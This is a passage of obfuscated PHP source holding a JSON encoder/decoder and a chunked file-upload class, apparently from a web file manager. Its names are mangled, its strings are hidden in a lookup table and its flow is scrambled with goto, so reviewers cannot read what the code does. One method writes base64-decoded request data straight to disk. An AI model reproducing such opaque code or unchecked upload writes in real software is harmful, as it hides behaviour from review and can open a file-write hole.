$C§·ÂŸÁ¾İ[1586], $C§·ÂŸÁ¾İ[1935]); } $BÛäã¡­ø = ord($fõ•‹¯†¹¹[0]) << 8 | ord($fõ•‹¯†¹¹[1]); switch (!0) { case (127 & $BÛäã¡­ø) == $BÛäã¡­ø: return chr(127 & $BÛäã¡­ø); case (2047 & $BÛäã¡­ø) == $BÛäã¡­ø: return chr(192 | $BÛäã¡­ø >> 6 & 31) . chr(128 | $BÛäã¡­ø & 63); case (65535 & $BÛäã¡­ø) == $BÛäã¡­ø: return chr(224 | $BÛäã¡­ø >> 12 & 15) . chr(128 | $BÛäã¡­ø >> 6 & 63) . chr(128 | $BÛäã¡­ø & 63); } return $C§·ÂŸÁ¾İ[33]; } function utf82utf16($Eò öÜÆ‘Ü) { $BÓ¢ˆ…¶´ =& $_SERVER[í…¶]; if (function_exists($BÓ¢ˆ…¶´[68])) { return mb_convert_encoding($Eò öÜÆ‘Ü, $BÓ¢ˆ…¶´[1935], $BÓ¢ˆ…¶´[1586]); } switch (strlen($Eò öÜÆ‘Ü)) { case 1: return $Eò öÜÆ‘Ü; case 2: return chr(7 & ord($Eò öÜÆ‘Ü[0]) >> 2) . chr(192 & ord($Eò öÜÆ‘Ü[0]) << 6 | 63 & ord($Eò öÜÆ‘Ü[1])); case 3: return chr(240 & ord($Eò öÜÆ‘Ü[0]) << 4 | 15 & ord($Eò öÜÆ‘Ü[1]) >> 2) . chr(192 & ord($Eò öÜÆ‘Ü[1]) << 6 | 127 & ord($Eò öÜÆ‘Ü[2])); } return $BÓ¢ˆ…¶´[33]; } function encode($c­²òÙ„Ò) { $aã©ÀÊ‘Èè =& $_SERVER[í…¶]; switch (gettype($c­²òÙ„Ò)) { case $aã©ÀÊ‘Èè[1597]: return $c­²òÙ„Ò ? $aã©ÀÊ‘Èè[1596] : $aã©ÀÊ‘Èè[1598]; case $aã©ÀÊ‘Èè[1936]: return $aã©ÀÊ‘Èè[99]; case $aã©ÀÊ‘Èè[303]: return (int) $c­²òÙ„Ò; case $aã©ÀÊ‘Èè[278]: case $aã©ÀÊ‘Èè[277]: return (double) $c­²òÙ„Ò; case $aã©ÀÊ‘Èè[312]: $eÚ¬øóÚ°ö = $aã©ÀÊ‘Èè[33]; $d¥ØÑÌ²ê› = strlen($c­²òÙ„Ò); for ($aâ·÷†“ÉÙ = 0; $aâ·÷†“ÉÙ < $d¥ØÑÌ²ê›; ++$aâ·÷†“ÉÙ) { $b¬‡ŞèÑáî = ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ]); switch (!0) { case $b¬‡ŞèÑáî == 8: $eÚ¬øóÚ°ö .= $aã©ÀÊ‘Èè[1937]; break; case $b¬‡ŞèÑáî == 9: $eÚ¬øóÚ°ö .= $aã©ÀÊ‘Èè[1573]; break; case $b¬‡ŞèÑáî == 10: $eÚ¬øóÚ°ö .= $aã©ÀÊ‘Èè[1571]; break; case $b¬‡ŞèÑáî == 12: $eÚ¬øóÚ°ö .= $aã©ÀÊ‘Èè[1938]; break; case $b¬‡ŞèÑáî == 13: $eÚ¬øóÚ°ö .= $aã©ÀÊ‘Èè[1572]; break; case $b¬‡ŞèÑáî == 34: case $b¬‡ŞèÑáî == 47: case $b¬‡ŞèÑáî == 92: $eÚ¬øóÚ°ö .= $aã©ÀÊ‘Èè[93] . $c­²òÙ„Ò[$aâ·÷†“ÉÙ]; break; case $b¬‡ŞèÑáî >= 32 && $b¬‡ŞèÑáî <= 127: $eÚ¬øóÚ°ö .= $c­²òÙ„Ò[$aâ·÷†“ÉÙ]; break; case ($b¬‡ŞèÑáî & 224) == 192: $D²Û«¿ÃöÕ = pack($aã©ÀÊ‘Èè[1939], $b¬‡ŞèÑáî, ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 1])); $aâ·÷†“ÉÙ += 1; $D‰ä•˜¯²ò = $this->utf82utf16($D²Û«¿ÃöÕ); $eÚ¬øóÚ°ö .= sprintf($aã©ÀÊ‘Èè[1940], bin2hex($D‰ä•˜¯²ò)); break; case ($b¬‡ŞèÑáî & 240) == 224: $D²Û«¿ÃöÕ = pack($aã©ÀÊ‘Èè[1939], $b¬‡ŞèÑáî, ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 1]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 2])); $aâ·÷†“ÉÙ += 2; $D‰ä•˜¯²ò = $this->utf82utf16($D²Û«¿ÃöÕ); $eÚ¬øóÚ°ö .= sprintf($aã©ÀÊ‘Èè[1940], bin2hex($D‰ä•˜¯²ò)); break; case ($b¬‡ŞèÑáî & 248) == 240: $D²Û«¿ÃöÕ = pack($aã©ÀÊ‘Èè[1939], $b¬‡ŞèÑáî, ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 1]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 2]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 3])); $aâ·÷†“ÉÙ += 3; $D‰ä•˜¯²ò = $this->utf82utf16($D²Û«¿ÃöÕ); $eÚ¬øóÚ°ö .= sprintf($aã©ÀÊ‘Èè[1940], bin2hex($D‰ä•˜¯²ò)); break; case ($b¬‡ŞèÑáî & 252) == 248: $D²Û«¿ÃöÕ = pack($aã©ÀÊ‘Èè[1939], $b¬‡ŞèÑáî, ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 1]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 2]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 3]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 4])); $aâ·÷†“ÉÙ += 4; $D‰ä•˜¯²ò = $this->utf82utf16($D²Û«¿ÃöÕ); $eÚ¬øóÚ°ö .= sprintf($aã©ÀÊ‘Èè[1940], bin2hex($D‰ä•˜¯²ò)); break; case ($b¬‡ŞèÑáî & 254) == 252: $D²Û«¿ÃöÕ = pack($aã©ÀÊ‘Èè[1939], $b¬‡ŞèÑáî, ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 1]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 2]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 3]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 4]), ord($c­²òÙ„Ò[$aâ·÷†“ÉÙ + 5])); $aâ·÷†“ÉÙ += 5; $D‰ä•˜¯²ò = $this->utf82utf16($D²Û«¿ÃöÕ); $eÚ¬øóÚ°ö .= sprintf($aã©ÀÊ‘Èè[1940], bin2hex($D‰ä•˜¯²ò)); break; } } return $aã©ÀÊ‘Èè[113] . $eÚ¬øóÚ°ö . $aã©ÀÊ‘Èè[113]; case $aã©ÀÊ‘Èè[1941]: if (is_array($c­²òÙ„Ò) && count($c­²òÙ„Ò) && array_keys($c­²òÙ„Ò) !== range(0, sizeof($c­²òÙ„Ò) - 1)) { $F‰õ½®ù = array_map(array($this, $aã©ÀÊ‘Èè[1942]), array_keys($c­²òÙ„Ò), array_values($c­²òÙ„Ò)); foreach ($F‰õ½®ù as $C÷Å’Íïß’) { if (Services_JSON::isError($C÷Å’Íïß’)) { return $C÷Å’Íïß’; } } return $aã©ÀÊ‘Èè[1066] . join($aã©ÀÊ‘Èè[47], $F‰õ½®ù) . $aã©ÀÊ‘Èè[315]; } $AÊĞÔ´îÍí = array_map(array($this, $aã©ÀÊ‘Èè[1943]), $c­²òÙ„Ò); foreach ($AÊĞÔ´îÍí as $FŒÃğëÔÂ³) { if (Services_JSON::isError($FŒÃğëÔÂ³)) { return $FŒÃğëÔÂ³; } } return $aã©ÀÊ‘Èè[157] . join($aã©ÀÊ‘Èè[47], $AÊĞÔ´îÍí) . $aã©ÀÊ‘Èè[485]; case $aã©ÀÊ‘Èè[1944]: $CÔŸÉ§„† = get_object_vars($c­²òÙ„Ò); $F‰õ½®ù = array_map(array($this, $aã©ÀÊ‘Èè[1942]), array_keys($CÔŸÉ§„†), array_values($CÔŸÉ§„†)); foreach ($F‰õ½®ù as $C÷Å’Íïß’) { if (Services_JSON::isError($C÷Å’Íïß’)) { return $C÷Å’Íïß’; } } return $aã©ÀÊ‘Èè[1066] . join($aã©ÀÊ‘Èè[47], $F‰õ½®ù) . $aã©ÀÊ‘Èè[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $aã©ÀÊ‘Èè[99] : new Services_JSON_Error(gettype($c­²òÙ„Ò) . $aã©ÀÊ‘Èè[1945]); } } function name_value($d¼÷«…Ã¨‰, $B÷ÈáÔ¬«¶) { $cÄ§ô•ºô = $this->encode($B÷ÈáÔ¬«¶); if (Services_JSON::isError($cÄ§ô•ºô)) { return $cÄ§ô•ºô; } return $this->encode(strval($d¼÷«…Ã¨‰)) . $_SERVER[í…¶][4] . $cÄ§ô•ºô; } function reduce_string($CÍà•º„Üù) { $dÏö£Š–´³ =& $_SERVER[í…¶]; $CÍà•º„Üù = preg_replace(array($dÏö£Š–´³[1946], $dÏö£Š–´³[1947], $dÏö£Š–´³[1948]), $dÏö£Š–´³[33], $CÍà•º„Üù); return trim($CÍà•º„Üù); } function decode($aŸŠµè¸Š…) { $f¢ËÌØ‰æ =& $_SERVER[í…¶]; $aŸŠµè¸Š… = $this->reduce_string($aŸŠµè¸Š…); switch (strtolower($aŸŠµè¸Š…)) { case $f¢ËÌØ‰æ[1596]: return !0; case $f¢ËÌØ‰æ[1598]: return !1; case $f¢ËÌØ‰æ[99]: return null; default: $b“íŒÎæï = array(); if (is_numeric($aŸŠµè¸Š…)) { return (double) $aŸŠµè¸Š… == (int) $aŸŠµè¸Š… ? (int) $aŸŠµè¸Š… : (double) $aŸŠµè¸Š…; } elseif (preg_match($f¢ËÌØ‰æ[1949], $aŸŠµè¸Š…, $b“íŒÎæï) && $b“íŒÎæï[1] == $b“íŒÎæï[2]) { $bÔÌâšÙ¡ = substr($aŸŠµè¸Š…, 0, 1); $D„‘Š„”Š = substr($aŸŠµè¸Š…, 1, -1); $DŠ¸áÁ¥‚¾ = $f¢ËÌØ‰æ[33]; $Aœ÷Óˆ‰œì = strlen($D„‘Š„”Š); for ($DÌÔ¶‚¤‡± = 0; $DÌÔ¶‚¤‡± < $Aœ÷Óˆ‰œì; ++$DÌÔ¶‚¤‡±) { $d×”¿ªÅ²á = substr($D„‘Š„”Š, $DÌÔ¶‚¤‡±, 2); $cçÑãå¢‚œ = ord($D„‘Š„”Š[$DÌÔ¶‚¤‡±]); switch (!0) { case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1937]: $DŠ¸áÁ¥‚¾ .= chr(8); ++$DÌÔ¶‚¤‡±; break; case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1573]: $DŠ¸áÁ¥‚¾ .= chr(9); ++$DÌÔ¶‚¤‡±; break; case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1571]: $DŠ¸áÁ¥‚¾ .= chr(10); ++$DÌÔ¶‚¤‡±; break; case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1938]: $DŠ¸áÁ¥‚¾ .= chr(12); ++$DÌÔ¶‚¤‡±; break; case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1572]: $DŠ¸áÁ¥‚¾ .= chr(13); ++$DÌÔ¶‚¤‡±; break; case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1353]: case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1950]: case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1566]: case $d×”¿ªÅ²á == $f¢ËÌØ‰æ[1568]: if ($bÔÌâšÙ¡ == $f¢ËÌØ‰æ[113] && $d×”¿ªÅ²á != $f¢ËÌØ‰æ[1950] || $bÔÌâšÙ¡ == $f¢ËÌØ‰æ[55] && $d×”¿ªÅ²á != $f¢ËÌØ‰æ[1353]) { $DŠ¸áÁ¥‚¾ .= $D„‘Š„”Š[++$DÌÔ¶‚¤‡±]; } break; case preg_match($f¢ËÌØ‰æ[1951], substr($D„‘Š„”Š, $DÌÔ¶‚¤‡±, 6)): $C…å” ÃÄœ = chr(hexdec(substr($D„‘Š„”Š, $DÌÔ¶‚¤‡± + 2, 2))) . chr(hexdec(substr($D„‘Š„”Š, $DÌÔ¶‚¤‡± + 4, 2))); $DŠ¸áÁ¥‚¾ .= $this->utf162utf8($C…å” ÃÄœ); $DÌÔ¶‚¤‡± += 5; break; case $cçÑãå¢‚œ >= 32 && $cçÑãå¢‚œ <= 127: $DŠ¸áÁ¥‚¾ .= $D„‘Š„”Š[$DÌÔ¶‚¤‡±]; break; case ($cçÑãå¢‚œ & 224) == 192: $DŠ¸áÁ¥‚¾ .= substr($D„‘Š„”Š, $DÌÔ¶‚¤‡±, 2); ++$DÌÔ¶‚¤‡±; break; case ($cçÑãå¢‚œ & 240) == 224: $DŠ¸áÁ¥‚¾ .= substr($D„‘Š„”Š, $DÌÔ¶‚¤‡±, 3); $DÌÔ¶‚¤‡± += 2; break; case ($cçÑãå¢‚œ & 248) == 240: $DŠ¸áÁ¥‚¾ .= substr($D„‘Š„”Š, $DÌÔ¶‚¤‡±, 4); $DÌÔ¶‚¤‡± += 3; break; case ($cçÑãå¢‚œ & 252) == 248: $DŠ¸áÁ¥‚¾ .= substr($D„‘Š„”Š, $DÌÔ¶‚¤‡±, 5); $DÌÔ¶‚¤‡± += 4; break; case ($cçÑãå¢‚œ & 254) == 252: $DŠ¸áÁ¥‚¾ .= substr($D„‘Š„”Š, $DÌÔ¶‚¤‡±, 6); $DÌÔ¶‚¤‡± += 5; break; } } return $DŠ¸áÁ¥‚¾; } elseif (preg_match($f¢ËÌØ‰æ[1952], $aŸŠµè¸Š…) || preg_match($f¢ËÌØ‰æ[1953], $aŸŠµè¸Š…)) { goto eİÂ÷äĞ«†; eİÂ÷äĞ«†: if ($aŸŠµè¸Š…[0] == $f¢ËÌØ‰æ[157]) { $eëŠ¤±ØÇ¥ = array(SERVICES_JSON_IN_ARR); $a‘©Í³Åëò = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eëŠ¤±ØÇ¥ = array(SERVICES_JSON_IN_OBJ); $FÇÁ¿ÜÏÊ¬ = array(); } else { $eëŠ¤±ØÇ¥ = array(SERVICES_JSON_IN_OBJ); $FÇÁ¿ÜÏÊ¬ = new stdClass(); } } array_push($eëŠ¤±ØÇ¥, array($f¢ËÌØ‰æ[1954] => SERVICES_JSON_SLICE, $f¢ËÌØ‰æ[263] => 0, $f¢ËÌØ‰æ[1955] => !1)); $D„‘Š„”Š = substr($aŸŠµè¸Š…, 1, -1); goto dÔ·ÙëŒŠ‚; cĞ¡Ï¯ÑóÂ: for ($DÌÔ¶‚¤‡± = 0; $DÌÔ¶‚¤‡± <= $Aœ÷Óˆ‰œì; ++$DÌÔ¶‚¤‡±) { $bã ¢Ù—‹ = end($eëŠ¤±ØÇ¥); $d×”¿ªÅ²á = substr($D„‘Š„”Š, $DÌÔ¶‚¤‡±, 2); if ($DÌÔ¶‚¤‡± == $Aœ÷Óˆ‰œì || $D„‘Š„”Š[$DÌÔ¶‚¤‡±] == $f¢ËÌØ‰æ[47] && $bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]] == SERVICES_JSON_SLICE) { $cÀÙ§øæÇ± = substr($D„‘Š„”Š, $bã ¢Ù—‹[$f¢ËÌØ‰æ[263]], $DÌÔ¶‚¤‡± - $bã ¢Ù—‹[$f¢ËÌØ‰æ[263]]); array_push($eëŠ¤±ØÇ¥, array($f¢ËÌØ‰æ[1954] => SERVICES_JSON_SLICE, $f¢ËÌØ‰æ[263] => $DÌÔ¶‚¤‡± + 1, $f¢ËÌØ‰æ[1955] => !1)); if (reset($eëŠ¤±ØÇ¥) == SERVICES_JSON_IN_ARR) { array_push($a‘©Í³Åëò, $this->decode($cÀÙ§øæÇ±)); } elseif (reset($eëŠ¤±ØÇ¥) == SERVICES_JSON_IN_OBJ) { $Bğ¿¬™Áî‹ = array(); if (preg_match($f¢ËÌØ‰æ[1956], $cÀÙ§øæÇ±, $Bğ¿¬™Áî‹)) { $B âùƒßó¤ = $this->decode($Bğ¿¬™Áî‹[1]); $a†ÂÚ––¾ = $this->decode($Bğ¿¬™Áî‹[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $FÇÁ¿ÜÏÊ¬[$B âùƒßó¤] = $a†ÂÚ––¾; } else { $FÇÁ¿ÜÏÊ¬->{$B âùƒßó¤} = $a†ÂÚ––¾; } } elseif (preg_match($f¢ËÌØ‰æ[1957], $cÀÙ§øæÇ±, $Bğ¿¬™Áî‹)) { $B âùƒßó¤ = $Bğ¿¬™Áî‹[1]; $a†ÂÚ––¾ = $this->decode($Bğ¿¬™Áî‹[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $FÇÁ¿ÜÏÊ¬[$B âùƒßó¤] = $a†ÂÚ––¾; } else { $FÇÁ¿ÜÏÊ¬->{$B âùƒßó¤} = $a†ÂÚ––¾; } } } } elseif (($D„‘Š„”Š[$DÌÔ¶‚¤‡±] == $f¢ËÌØ‰æ[113] || $D„‘Š„”Š[$DÌÔ¶‚¤‡±] == $f¢ËÌØ‰æ[55]) && $bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]] != SERVICES_JSON_IN_STR) { array_push($eëŠ¤±ØÇ¥, array($f¢ËÌØ‰æ[1954] => SERVICES_JSON_IN_STR, $f¢ËÌØ‰æ[263] => $DÌÔ¶‚¤‡±, $f¢ËÌØ‰æ[1955] => $D„‘Š„”Š[$DÌÔ¶‚¤‡±])); } elseif ($D„‘Š„”Š[$DÌÔ¶‚¤‡±] == $bã ¢Ù—‹[$f¢ËÌØ‰æ[1955]] && $bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]] == SERVICES_JSON_IN_STR && (strlen(substr($D„‘Š„”Š, 0, $DÌÔ¶‚¤‡±)) - strlen(rtrim(substr($D„‘Š„”Š, 0, $DÌÔ¶‚¤‡±), $f¢ËÌØ‰æ[93]))) % 2 != 1) { array_pop($eëŠ¤±ØÇ¥); } elseif ($D„‘Š„”Š[$DÌÔ¶‚¤‡±] == $f¢ËÌØ‰æ[157] && in_array($bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eëŠ¤±ØÇ¥, array($f¢ËÌØ‰æ[1954] => SERVICES_JSON_IN_ARR, $f¢ËÌØ‰æ[263] => $DÌÔ¶‚¤‡±, $f¢ËÌØ‰æ[1955] => !1)); } elseif ($D„‘Š„”Š[$DÌÔ¶‚¤‡±] == $f¢ËÌØ‰æ[485] && $bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]] == SERVICES_JSON_IN_ARR) { array_pop($eëŠ¤±ØÇ¥); } elseif ($D„‘Š„”Š[$DÌÔ¶‚¤‡±] == $f¢ËÌØ‰æ[1066] && in_array($bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eëŠ¤±ØÇ¥, array($f¢ËÌØ‰æ[1954] => SERVICES_JSON_IN_OBJ, $f¢ËÌØ‰æ[263] => $DÌÔ¶‚¤‡±, $f¢ËÌØ‰æ[1955] => !1)); } elseif ($D„‘Š„”Š[$DÌÔ¶‚¤‡±] == $f¢ËÌØ‰æ[315] && $bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]] == SERVICES_JSON_IN_OBJ) { array_pop($eëŠ¤±ØÇ¥); } elseif ($d×”¿ªÅ²á == $f¢ËÌØ‰æ[1958] && in_array($bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eëŠ¤±ØÇ¥, array($f¢ËÌØ‰æ[1954] => SERVICES_JSON_IN_CMT, $f¢ËÌØ‰æ[263] => $DÌÔ¶‚¤‡±, $f¢ËÌØ‰æ[1955] => !1)); $DÌÔ¶‚¤‡±++; } elseif ($d×”¿ªÅ²á == $f¢ËÌØ‰æ[1959] && $bã ¢Ù—‹[$f¢ËÌØ‰æ[1954]] == SERVICES_JSON_IN_CMT) { array_pop($eëŠ¤±ØÇ¥); $DÌÔ¶‚¤‡±++; for ($dçñ†í»åÏ = $bã ¢Ù—‹[$f¢ËÌØ‰æ[263]]; $dçñ†í»åÏ <= $DÌÔ¶‚¤‡±; ++$dçñ†í»åÏ) { $D„‘Š„”Š = substr_replace($D„‘Š„”Š, $f¢ËÌØ‰æ[50], $dçñ†í»åÏ, 1); } } } if (reset($eëŠ¤±ØÇ¥) == SERVICES_JSON_IN_ARR) { return $a‘©Í³Åëò; } elseif (reset($eëŠ¤±ØÇ¥) == SERVICES_JSON_IN_OBJ) { return $FÇÁ¿ÜÏÊ¬; } goto cõºÄ˜ğñ; dÔ·ÙëŒŠ‚: $D„‘Š„”Š = $this->reduce_string($D„‘Š„”Š); if ($D„‘Š„”Š == $f¢ËÌØ‰æ[33]) { if (reset($eëŠ¤±ØÇ¥) == SERVICES_JSON_IN_ARR) { return $a‘©Í³Åëò; } else { return $FÇÁ¿ÜÏÊ¬; } } $Aœ÷Óˆ‰œì = strlen($D„‘Š„”Š); goto cĞ¡Ï¯ÑóÂ; cõºÄ˜ğñ: } } } function isError($aä„º‚ë½, $D…Ó·áµ®º = null) { $aìá“Š… =& $_SERVER[í…¶]; if (class_exists($aìá“Š…[1960])) { return PEAR::isError($aä„º‚ë½, $D…Ó·áµ®º); } elseif (is_object($aä„º‚ë½) && (get_class($aä„º‚ë½) == $aìá“Š…[1961] || is_subclass_of($aä„º‚ë½, $aìá“Š…[1961]))) { return !0; } return !1; } } if (class_exists($_SERVER[í…¶][1962])) { class Services_JSON_Error extends PEAR_Error { function __construct($Fİ÷‡µ«çİ = "\x75\156\x6b\156\x6f\167\156\x20\x65\x72\x72\x6f\x72", $fÑÚª†Š Ø = null, $B‰Š½°‡ßâ = null, $c¸Œ¼ÊĞ = null, $aˆÜŞŠÌ‹ = null) { parent::PEAR_Error($Fİ÷‡µ«çİ, $fÑÚª†Š Ø, $B‰Š½°‡ßâ, $c¸Œ¼ÊĞ, $aˆÜŞŠÌ‹); } } } else { class Services_JSON_Error { function __construct($Dæ×¡µ¿ğ = "\x75\156\x6b\156\x6f\167\156\40\x65\x72\x72\157\x72", $dšÂ„»Ò¨ = null, $D á¨ÏÚº = null, $F«©¤½Ãê = null, $DšàĞ…µÙÔ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto CÓ£ÖçÄà; bŞ‘ğİ“­: if (!empty($_FILES)) { $AçÃì‚…Ù¾ = $_FILES[$côê’¼¢¹[167]]; $this->uploadFile = $AçÃì‚…Ù¾[$côê’¼¢¹[1963]]; if (!$this->uploadFile && $AçÃì‚…Ù¾[$côê’¼¢¹[1217]] > 0) { show_json($this->errorInfo($AçÃì‚…Ù¾[$côê’¼¢¹[1217]]), !1); } } else { if (isset($in[$côê’¼¢¹[395]])) { $this->uploadFile = isset($in[$côê’¼¢¹[1964]]) ? $côê’¼¢¹[1965] : $côê’¼¢¹[1810]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto b†ß¿öÎ×·; CÓ£ÖçÄà: $côê’¼¢¹ =& $_SERVER[í…¶]; global $in; $this->in =& $in; goto bŞ‘ğİ“­; b†ß¿öÎ×·: $this->checkSize(); $this->tempPathInit(); goto B»‹ä‚ô½; B»‹ä‚ô½: } public function upload() { goto FÜ¿Ï¢†; BÎ©£ŠÑ: $CŸîÜßˆä = $Añë‡”Ú÷ * $f½ó‘¿¬à; $E¨¹»é‡‡µ = @fopen($this->tempFile, $BÀ†¸¼´ãó[1973]); fseek($E¨¹»é‡‡µ, $CŸîÜßˆä); goto B°øÂ§ŞòÌ; B°øÂ§ŞòÌ: $E··ŠÚŸéÔ = $this->writeTo($cØà÷ƒÅ´¶, $E¨¹»é‡‡µ, $this->tempFile); $F¶²ÇæÁ = IO::hashSimple($cØà÷ƒÅ´¶); $E‘ƒÛÚ¸ÉÙ = IO::size($cØà÷ƒÅ´¶); goto câ¥ºÇº; FÜ¿Ï¢†: $BÀ†¸¼´ãó =& $_SERVER[í…¶]; $Añë‡”Ú÷ = isset($this->in[$BÀ†¸¼´ãó[1966]]) ? intval($this->in[$BÀ†¸¼´ãó[1966]]) : 0; $fÂŠÃøóö = isset($this->in[$BÀ†¸¼´ãó[1967]]) ? intval($this->in[$BÀ†¸¼´ãó[1967]]) : 1; goto f»¤‘í‡‘š; Câ¡ãíš¸Í: CacheLock::unlock($this->tempFile); return $this->tempFile; goto AŠÊ­¾­‰; f»¤‘í‡‘š: $dÄ©¡“Ğá = $this->tempFile . $BÀ†¸¼´ãó[1968] . $Añë‡”Ú÷; $E‘ƒÛÚ¸ÉÙ = isset($this->in[$BÀ†¸¼´ãó[529]]) ? intval($this->in[$BÀ†¸¼´ãó[529]]) : 0; $f½ó‘¿¬à = isset($this->in[$BÀ†¸¼´ãó[1969]]) ? intval($this->in[$BÀ†¸¼´ãó[1969]]) : 0; goto d´‚µƒ¯; câ¥ºÇº: @unlink($cØà÷ƒÅ´¶); if (!$E··ŠÚŸéÔ) { $this->showJson($BÀ†¸¼´ãó[1974] . $Añë‡”Ú÷, !1); } $Dà¶…¶ÚÙ–[$BÀ†¸¼´ãó[1975]] = $fÂŠÃøóö; goto dÆ¾¨Éİ«ï; AÄùÄŒÉ’: $cØà÷ƒÅ´¶ = $this->moveUploadedFile($dÄ©¡“Ğá); if ($E‘ƒÛÚ¸ÉÙ > 0 && filesize($cØà÷ƒÅ´¶) == 0) { $this->showJson($BÀ†¸¼´ãó[1971], !1); } if (!$cØà÷ƒÅ´¶) { $this->showJson(LNG($BÀ†¸¼´ãó[1972]), !1); } goto BÎ©£ŠÑ; dÆ¾¨Éİ«ï: $Dà¶…¶ÚÙ–[$BÀ†¸¼´ãó[1976]][$BÀ†¸¼´ãó[1977] . $Añë‡”Ú÷] = array($BÀ†¸¼´ãó[1978] => $CŸîÜßˆä, $BÀ†¸¼´ãó[1034] => $Añë‡”Ú÷, $BÀ†¸¼´ãó[77] => $E‘ƒÛÚ¸ÉÙ, $BÀ†¸¼´ãó[164] => $F¶²ÇæÁ); $this->statusSet($Dà¶…¶ÚÙ–); if (count($Dà¶…¶ÚÙ–[$BÀ†¸¼´ãó[1976]]) != $Dà¶…¶ÚÙ–[$BÀ†¸¼´ãó[1975]]) { $this->showJson($BÀ†¸¼´ãó[1979] . $Añë‡”Ú÷, !0); } goto a°¡ªÁ‰ˆ; a°¡ªÁ‰ˆ: ignore_timeout(); if (!$this->checkChunkHash($Dà¶…¶ÚÙ–)) { $this->showJson($BÀ†¸¼´ãó[1980], !1); } $this->statusSet(!1); goto Câ¡ãíš¸Í; c‚á££æ†È: CacheLock::lock($this->tempFile, 20); $Dà¶…¶ÚÙ– = $this->statusGet(); $this->initFileTemp(); goto AÄùÄŒÉ’; d´‚µƒ¯: if ($fÂŠÃøóö > 1 && $f½ó‘¿¬à <= 0) { show_json($BÀ†¸¼´ãó[1970], !1); } if ($f½ó‘¿¬à > $E‘ƒÛÚ¸ÉÙ) { $fÂŠÃøóö = 1; } if ($fÂŠÃøóö <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto c‚á££æ†È; AŠÊ­¾­‰: } private function checkSize() { $C®¯Œ¨ŞšÆ =& $_SERVER[í…¶]; if (phpBuild64() || $this->in[$C®¯Œ¨ŞšÆ[77]] < PHP_INT_MAX) { return; } show_json(LNG($C®¯Œ¨ŞšÆ[1981]), !1); } private function showJson($d©ƒ„Í£†¬, $C†–Àà¬²›) { CacheLock::unlock($this->tempFile); if (!$C†–Àà¬²›) { return show_json($d©ƒ„Í£†¬, $C†–Àà¬²›); } show_json($d©ƒ„Í£†¬, $C†–Àà¬²›); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto C‹Ù’–Ş³†; DÓÕƒŸ›Çó: $this->tempFile = $BÎ­½êï›ˆ . $Fº­ß³Íİ[1984] . md5($Aª…Ì½ ³“ . $this->in[$Fº­ß³Íİ[1528]]); goto bÏØöäÔÔ; DĞ˜ÃÂéÍ: touch($BÎ­½êï›ˆ . $Fº­ß³Íİ[1982]); $Aª…Ì½ ³“ = isset($this->in[$Fº­ß³Íİ[1983]]) ? $this->in[$Fº­ß³Íİ[1983]] : !1; if (strlen($Aª…Ì½ ³“) < 30) { $Aª…Ì½ ³“ = md5(USER_ID . $this->in[$Fº­ß³Íİ[75]] . $this->fileName . $this->in[$Fº­ß³Íİ[77]]); } goto DÓÕƒŸ›Çó; C‹Ù’–Ş³†: $Fº­ß³Íİ =& $_SERVER[í…¶]; $BÎ­½êï›ˆ = TEMP_FILES; @mk_dir($BÎ­½êï›ˆ); goto DĞ˜ÃÂéÍ; bÏØöäÔÔ: } private function moveUploadedFile($Aä¤àÚÈÏÎ) { $bìŞÌŒ‘ÔŒ =& $_SERVER[í…¶]; $B§¬à›¥Æ = $this->uploadFile; if ($B§¬à›¥Æ == $bìŞÌŒ‘ÔŒ[1985]) { @file_put_contents($Aä¤àÚÈÏÎ, base64_decode($_REQUEST[$bìŞÌŒ‘ÔŒ[1986]])); } else { if ($B§¬à›¥Æ == $bìŞÌŒ‘ÔŒ[1810]) { $aÓÑ±†ùíå = @fopen($Aä¤àÚÈÏÎ, $bìŞÌŒ‘ÔŒ[1518]); $this->writeTo($B§¬à›¥Æ, $aÓÑ±†ùíå, $Aä¤àÚÈÏÎ); } else { if (!move_uploaded_file($B§¬à›¥Æ, 